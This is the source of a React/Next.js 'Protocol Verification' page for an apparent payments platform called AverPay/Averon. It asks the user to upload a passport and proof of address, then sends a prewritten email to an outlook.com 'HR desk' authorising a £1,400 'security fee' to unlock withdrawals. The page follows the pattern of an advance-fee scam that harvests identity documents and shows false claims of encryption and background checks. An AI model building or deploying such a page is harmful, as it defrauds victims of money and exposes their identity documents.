'use client';
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { ArrowLeft, ShieldCheck, FileText, Map, KeyRound, Mail, BadgeCheck, Upload, Zap, Globe, Lock, Check } from "lucide-react";
import Link from "next/link";
import { useToast } from "@/hooks/use-toast";
import React, { useEffect, useState } from "react";
import { updateUserData, initializeUsers, saveData, addActivityLog } from "@/lib/mock-data";
import { useRouter } from "next/navigation";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import DashboardLayout from "@/components/ui/dashboard-layout";
import { motion } from "motion/react";
import { cn } from "@/lib/utils";


export default function VerificationPage() {
    const { toast } = useToast();
    const router = useRouter();
    const [userProfile, setUserProfile] = useState<any>(null);

    useEffect(() => {
        initializeUsers();
        const storedUser = localStorage.getItem('loggedInUser');
        if (storedUser) {
            setUserProfile(JSON.parse(storedUser));
        } else {
            router.push('/login');
        }
    }, [router]);

    const handleProceedToPayment = () => {
        if (!userProfile?.verificationIdUrl) {
            toast({
                variant: 'destructive',
                title: 'ID Document Required',
                description: 'Please upload your verification ID document before proceeding to payment.'
            });
            return;
        }

        const recipient = "averon.hrdesk@outlook.com";
        const subject = `Verification Request: ${userProfile?.averpayId}`;
        const body = `
            Averon Supervisor Support,

            I have uploaded my operational identification documents to the Registry. I am ready to conclude the payout verification protocol and authorize the security fee of £1,400.

            Agent Name: ${userProfile?.fullName}
            Agent ID: ${userProfile?.averpayId}
            UID: ${userProfile?.uid}

            Awaiting secure payment link.
        `;

        const mailtoLink = `mailto:${recipient}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
        window.location.href = mailtoLink;
    };

    const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>, fileType: 'verification' | 'address') => {
        const file = e.target.files?.[0];
        if (!file || !userProfile) return;

        const reader = new FileReader();
        reader.onloadend = () => {
            const dataUrl = reader.result as string;
            const fieldName = fileType === 'verification' ? 'verificationIdUrl' : 'proofOfAddressUrl';
        
            const updatedUser = updateUserData(userProfile.uid, { [fieldName]: dataUrl });
            setUserProfile(updatedUser);
            saveData('loggedInUser', updatedUser);

            addActivityLog({
                type: 'verification',
                user: userProfile.fullName,
                target: 'Registry',
                description: `Uploaded ${fileType === 'verification' ? 'Identity ID' : 'Proof of Address'} document.`
            });

            toast({
                title: 'Transmission Success',
                description: 'Document encrypted and stored in local vault buffer.',
            });
        };
        reader.readAsDataURL(file);
    };

    if (!userProfile) return null;

    return (
        <DashboardLayout>
            <div className="max-w-4xl mx-auto py-10 px-4 sm:px-8 space-y-12 animate-in fade-in slide-in-from-bottom-4 duration-1000">
                <header className="flex flex-col gap-4">
                    <Link href="/dashboard/settings" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors w-fit">
                        <ArrowLeft className="h-4 w-4" />
                        <span className="text-[10px] font-black uppercase tracking-widest">Return to Settings</span>
                    </Link>
                    <div>
                        <h1 className="text-5xl font-black text-white tracking-tighter mb-2">Protocol <span className="text-primary italic">Verification</span></h1>
                        <p className="text-muted-foreground font-medium max-w-xl">Finalize your operational identity to unlock unlimited global dispatches and liquid asset withdrawals.</p>
                    </div>
                </header>

                <div className="grid grid-cols-1 lg:grid-cols-5 gap-10">
                    {/* Left Column: Requirements */}
                    <div className="lg:col-span-3 space-y-8">
                        <section className="space-y-6">
                            <h3 className="text-xs font-black uppercase tracking-[0.2em] text-primary">Requirement 01: Identification</h3>
                            <Card className={cn(
                                "p-8 bg-[#050f26] border-white/5 rounded-[2.5rem] relative overflow-hidden group transition-all",
                                userProfile.verificationIdUrl && "border-green-500/30"
                            )}>
                                <div className="flex flex-col sm:flex-row items-start gap-6">
                                    <div className="h-14 w-14 rounded-2xl bg-primary/10 flex items-center justify-center border border-primary/20 shrink-0">
                                        <FileText className="h-7 w-7 text-primary" />
                                    </div>
                                    <div className="flex-1 space-y-4">
                                        <div>
                                            <h4 className="text-xl font-bold text-white mb-1">Passport / National ID</h4>
                                            <p className="text-xs text-muted-foreground font-medium italic">Requirement: Clear visual of name, expiry, and photo.</p>
                                        </div>
                                        
                                        <div className="flex items-center gap-4">
                                            <Button variant="outline" className="rounded-xl h-10 border-white/10 bg-white/5 font-black uppercase text-[10px] tracking-widest px-6 hover:bg-white/10" onClick={() => document.getElementById('id-upload')?.click()}>
                                                <Upload className="h-3 w-3 mr-2" />
                                                {userProfile.verificationIdUrl ? 'Replace Object' : 'Initialize Upload'}
                                            </Button>
                                            <Input id="id-upload" type="file" className="hidden" onChange={(e) => handleFileUpload(e, 'verification')} />
                                            {userProfile.verificationIdUrl && (
                                                <div className="flex items-center gap-2 text-green-500 text-[10px] font-black uppercase tracking-widest">
                                                    <Check className="h-4 w-4" />
                                                    Encrypted Sink
                                                </div>
                                            )}
                                        </div>
                                    </div>
                                </div>
                            </Card>
                        </section>

                        <section className="space-y-6">
                            <h3 className="text-xs font-black uppercase tracking-[0.2em] text-primary">Requirement 02: Presence</h3>
                            <Card className={cn(
                                "p-8 bg-[#050f26] border-white/5 rounded-[2.5rem] relative overflow-hidden group transition-all",
                                userProfile.proofOfAddressUrl && "border-green-500/30"
                            )}>
                                <div className="flex flex-col sm:flex-row items-start gap-6">
                                    <div className="h-14 w-14 rounded-2xl bg-primary/10 flex items-center justify-center border border-primary/20 shrink-0">
                                        <Globe className="h-7 w-7 text-primary" />
                                    </div>
                                    <div className="flex-1 space-y-4">
                                        <div>
                                            <h4 className="text-xl font-bold text-white mb-1">Proof of Address</h4>
                                            <p className="text-xs text-muted-foreground font-medium italic">Requirement: Utility bill or bank statement (90 days old max).</p>
                                        </div>
                                        
                                        <div className="flex items-center gap-4">
                                            <Button variant="outline" className="rounded-xl h-10 border-white/10 bg-white/5 font-black uppercase text-[10px] tracking-widest px-6 hover:bg-white/10" onClick={() => document.getElementById('address-upload')?.click()}>
                                                <Upload className="h-3 w-3 mr-2" />
                                                {userProfile.proofOfAddressUrl ? 'Replace Object' : 'Initialize Upload'}
                                            </Button>
                                            <Input id="address-upload" type="file" className="hidden" onChange={(e) => handleFileUpload(e, 'address')} />
                                            {userProfile.proofOfAddressUrl && (
                                                <div className="flex items-center gap-2 text-green-500 text-[10px] font-black uppercase tracking-widest">
                                                    <Check className="h-4 w-4" />
                                                    Encrypted Sink
                                                </div>
                                            )}
                                        </div>
                                    </div>
                                </div>
                            </Card>
                        </section>
                    </div>

                    {/* Right Column: Activation */}
                    <div className="lg:col-span-2">
                        <div className="sticky top-10 space-y-8">
                            <Card className="p-8 bg-[#050f26] border-t-4 border-t-primary border-white/5 rounded-[3rem] shadow-2xl relative overflow-hidden">
                                <div className="absolute top-[-10%] right-[-10%] opacity-5 rotate-12">
                                    <Zap className="h-40 w-40 text-primary" />
                                </div>
                                
                                <div className="relative space-y-8">
                                    <div>
                                        <h3 className="text-2xl font-black text-white mb-2 italic">System Activation</h3>
                                        <p className="text-xs text-muted-foreground font-medium leading-relaxed">Required security fee for global background audit and AverPay ID authentication.</p>
                                    </div>

                                    <div className="bg-white/5 rounded-3xl p-6 text-center border border-white/10">
                                        <p className="text-[10px] font-black text-muted-foreground uppercase tracking-[0.2em] mb-1">Total Due</p>
                                        <p className="text-5xl font-black text-white tracking-tighter">£1,400</p>
                                        <p className="text-[10px] text-primary font-black uppercase tracking-widest mt-2">Platform Activation Fee</p>
                                    </div>

                                    <div className="space-y-4">
                                        {[
                                            { label: 'E2E Encryption Activation', icon: Lock },
                                            { label: 'International Background Check', icon: BadgeCheck },
                                            { label: 'Priority Support Access', icon: Zap },
                                        ].map((item, i) => (
                                            <div key={i} className="flex items-center gap-3">
                                                <item.icon className="h-4 w-4 text-primary" />
                                                <span className="text-xs font-bold text-white/80">{item.label}</span>
                                            </div>
                                        ))}
                                    </div>

                                    <Button onClick={handleProceedToPayment} className="w-full bg-primary text-black font-black uppercase tracking-widest rounded-2xl h-16 text-lg hover:bg-primary/90 shadow-xl shadow-primary/20">
                                        Execute Activation
                                    </Button>

                                    <p className="text-[10px] text-center text-muted-foreground font-medium">Clicking will initiate secure contact with the HR desk for payment routing.</p>
                                </div>
                            </Card>
                        </div>
                    </div>
                </div>
            </div>
        </DashboardLayout>
    );
}
